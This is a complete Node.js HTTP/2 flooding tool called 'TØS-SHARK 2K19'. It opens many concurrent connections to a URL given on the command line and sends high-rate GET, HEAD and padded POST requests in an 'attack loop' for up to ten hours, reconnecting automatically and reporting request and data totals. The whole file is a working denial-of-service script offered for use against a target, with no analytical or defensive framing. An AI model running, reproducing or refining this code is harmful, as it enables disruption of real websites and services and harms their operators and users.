const http2 = require('http2');
const os = require('os');

class TOS_SHARK_LEAKPROOF {
    constructor(targetUrl) {
        this.targetUrl = targetUrl;
        this.hostname = new URL(targetUrl).hostname;
        this.totalRequests = 0;
        this.payloadSentGB = 0;
        this.payloadCounter = 0;
        
        // EFFICIENT CONNECTIONS WITH CLEANUP
        this.clients = new Map(); // Map for better cleanup
        this.clientCount = 12;
        this.activeStreams = 0;
        this.maxStreamsPerClient = 500;
        
        // REQUEST TRACKING (LEAK PREVENTION)
        this.activeRequests = new Map();
        this.lastCleanup = Date.now();
        
        // PAYLOAD SYSTEM
        this.requestCounter = 0;
        this.payloadThreshold = 5000;
        this.payloadSizes = [1024, 2048, 3072, 4096, 5120];
        this.methods = ['GET', 'HEAD'];
        
        // TIME LIMIT
        this.startTime = Date.now();
        this.maxRuntime = 10 * 60 * 60 * 1000;
        this.running = true;
        
        // PERFORMANCE
        this.requestsSinceLastCalc = 0;
        this.lastRpsCalc = Date.now();
        
        // INTERVALS
        this.attackInterval = null;
        this.displayInterval = null;
        this.cleanupInterval = null;
    }

    // === LEAK-PROOF CONNECTIONS ===
    initializeConnections() {
        for (let i = 0; i < this.clientCount; i++) {
            this.createConnection(i);
        }
    }

    createConnection(id) {
        try {
            const client = http2.connect(this.targetUrl, {
                maxSessionMemory: 16384,
                peerMaxConcurrentStreams: 500
            });
            
            client.setMaxListeners(500);
            client.settings({ maxConcurrentStreams: 500 });
            
            // PROPER ERROR HANDLING WITH CLEANUP
            client.on('error', () => {
                this.removeConnection(id);
                setTimeout(() => this.createConnection(id), 100);
            });
            
            client.on('close', () => {
                this.removeConnection(id);
                setTimeout(() => this.createConnection(id), 100);
            });
            
            this.clients.set(id, {
                client,
                created: Date.now(),
                requests: 0,
                healthy: true
            });
            
        } catch (err) {
            setTimeout(() => this.createConnection(id), 1000);
        }
    }

    removeConnection(id) {
        const conn = this.clients.get(id);
        if (conn) {
            try { conn.client.destroy(); } catch (e) {}
            this.clients.delete(id);
        }
    }

    // === MEMORY CLEANUP SYSTEM ===
    performCleanup() {
        const now = Date.now();
        
        // CLEAN STALE REQUESTS (10+ seconds old)
        for (const [reqId, timestamp] of this.activeRequests.entries()) {
            if (now - timestamp > 10000) {
                this.activeRequests.delete(reqId);
            }
        }
        
        // CLEAN OLD CONNECTIONS (30+ minutes)
        for (const [id, conn] of this.clients.entries()) {
            if (now - conn.created > 1800000) { // 30 minutes
                this.removeConnection(id);
                this.createConnection(id);
            }
        }
        
        // FORCE GC IF AVAILABLE
        if (now - this.lastCleanup > 30000 && global.gc) { // Every 30s
            global.gc();
            this.lastCleanup = now;
        }
    }

    // === LEAK-PROOF REQUEST ===
    sendEfficientRequest() {
        if (!this.running || this.clients.size === 0) return;
        
        this.requestCounter++;
        const isPayloadRequest = this.requestCounter % this.payloadThreshold === 0;
        const method = isPayloadRequest ? 'POST' : this.methods[Math.floor(Math.random() * this.methods.length)];
        
        // GET RANDOM CLIENT
        const clientIds = Array.from(this.clients.keys());
        if (clientIds.length === 0) return;
        
        const clientId = clientIds[Math.floor(Math.random() * clientIds.length)];
        const conn = this.clients.get(clientId);
        if (!conn) return;

        try {
            this.activeStreams++;
            const reqId = Math.random().toString(36);
            this.activeRequests.set(reqId, Date.now());
            conn.requests++;
            
            const headers = {
                ':method': method,
                ':path': '/',
                ':authority': this.hostname
            };
            
            let payload = '';
            
            if (isPayloadRequest && method === 'POST') {
                const payloadSize = this.payloadSizes[Math.floor(Math.random() * this.payloadSizes.length)];
                payload = 'TØS-SHARK-2K19-' + 'x'.repeat(payloadSize - 20);
                headers['content-type'] = 'text/plain';
                headers['content-length'] = Buffer.byteLength(payload).toString();
                
                this.payloadSentGB += payloadSize / (1024 * 1024 * 1024);
                this.payloadCounter++;
            }
            
            const req = conn.client.request(headers);
            
            if (isPayloadRequest && method === 'POST' && payload) {
                req.write(payload);
            }
            
            const cleanup = () => {
                this.activeStreams--;
                this.totalRequests++;
                this.requestsSinceLastCalc++;
                this.activeRequests.delete(reqId);
                req.removeAllListeners();
            };
            
            req.once('response', () => {
                req.destroy();
                cleanup();
            });
            
            req.once('error', () => {
                req.destroy();
                cleanup();
            });
            
            req.once('close', cleanup);
            
            req.end();
            
        } catch (err) {
            this.activeStreams--;
            this.totalRequests++;
            this.requestsSinceLastCalc++;
        }
    }

    // === DISPLAY ===
    updateDisplay() {
        const now = Date.now();
        const timeDiff = (now - this.lastRpsCalc) / 1000;
        
        if (timeDiff >= 0.9) {
            const currentRPS = this.requestsSinceLastCalc / timeDiff;
            this.requestsSinceLastCalc = 0;
            this.lastRpsCalc = now;
            
            const payloadGB = this.payloadSentGB.toFixed(3);
            process.stdout.write(`\rTØS-SHARK | 2K19\n---------------------------------\nTRS-SHARK — ${this.totalRequests} | ${payloadGB}GB`);
        }
    }

    // === MAIN ===
    start() {
        console.log('=== TØS-SHARK 2K19 (LEAK-PROOF) ===');
        console.log('Memory Management: Active');
        console.log('='.repeat(40));
        
        this.initializeConnections();
        
        setTimeout(() => {
            // ATTACK LOOP
            this.attackInterval = setInterval(() => {
                if (this.running) {
                    const availableStreams = (this.maxStreamsPerClient * this.clients.size) - this.activeStreams;
                    const batchSize = Math.min(availableStreams, 30);
                    
                    for (let i = 0; i < batchSize; i++) {
                        this.sendEfficientRequest();
                    }
                    
                    // CHECK TIME LIMIT
                    if (Date.now() - this.startTime >= this.maxRuntime) {
                        console.log('\n\n[!] 10 HOUR LIMIT REACHED [!]');
                        this.stop();
                    }
                }
            }, 0.1);
            
            // DISPLAY
            this.displayInterval = setInterval(() => {
                if (this.running) this.updateDisplay();
            }, 1);
            
            // CLEANUP (EVERY 5s)
            this.cleanupInterval = setInterval(() => {
                this.performCleanup();
            }, 5000);
            
        }, 2000);
        
        process.on('SIGINT', this.stop.bind(this));
    }

    stop() {
        console.log('\n\n=== TØS-SHARK STOPPED ===');
        console.log(`Total Requests: ${this.totalRequests.toLocaleString()}`);
        console.log(`Total Payload: ${this.payloadSentGB.toFixed(3)} GB`);
        
        this.running = false;
        clearInterval(this.attackInterval);
        clearInterval(this.displayInterval);
        clearInterval(this.cleanupInterval);
        
        for (const [id, conn] of this.clients.entries()) {
            try { conn.client.destroy(); } catch (e) {}
        }
        
        this.clients.clear();
        this.activeRequests.clear();
        
        process.exit(0);
    }
}

// USAGE
const target = process.argv[2];
if (!target) {
    console.log('Usage: node tos-shark-leakproof.js https://target.com');
    process.exit(1);
}

const shark = new TOS_SHARK_LEAKPROOF(target);
shark.start();
